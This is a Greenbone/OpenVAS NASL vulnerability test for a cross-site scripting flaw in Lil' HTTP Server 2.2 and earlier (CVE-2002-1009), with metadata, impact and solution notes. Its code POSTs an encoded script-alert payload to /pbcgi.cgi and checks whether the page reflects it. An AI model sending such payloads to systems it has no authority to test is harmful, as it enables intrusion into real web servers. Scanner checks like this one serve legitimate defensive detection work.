if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902437" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_cve_id( "CVE-2002-1009" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-06-02 11:54:09 +0200 (Thu, 02 Jun 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Lil' HTTP Server Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101758/lilhttp-xss.txt" );
	script_xref( name: "URL", value: "http://www.securityhome.eu/exploits/exploit.php?eid=5477687364de02d6a4c2430.52315196" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "LilHTTP/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to plant XSS
  backdoors and inject arbitrary SQL statements via crafted XSS payloads." );
	script_tag( name: "affected", value: "LilHTTP Server version 2.2 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input,
  passed in the 'name' and 'email' parameter in 'cgitest.html', when handling the
  'CGI Form Demo' application." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running LilHTTP Web Server and is prone to cross site
  scripting vulnerability" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
lilPort = http_get_port( default: 80 );
banner = http_get_remote_headers( port: lilPort );
if(!banner || !ContainsString( banner, "Server: LilHTTP" )){
	exit( 0 );
}
postdata = "name=%3Cscript%3Ealert%28%27VT-XSS-TEST%27%29%3C%2Fscript%3E&email=";
url = "/pbcgi.cgi";
useragent = http_get_user_agent();
host = http_host_name( port: lilPort );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: lilPort, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "name=<script>alert('VT-XSS-TEST')</script>" )){
	report = http_report_vuln_url( port: lilPort, url: url );
	security_message( port: lilPort, data: report );
	exit( 0 );
}
exit( 99 );

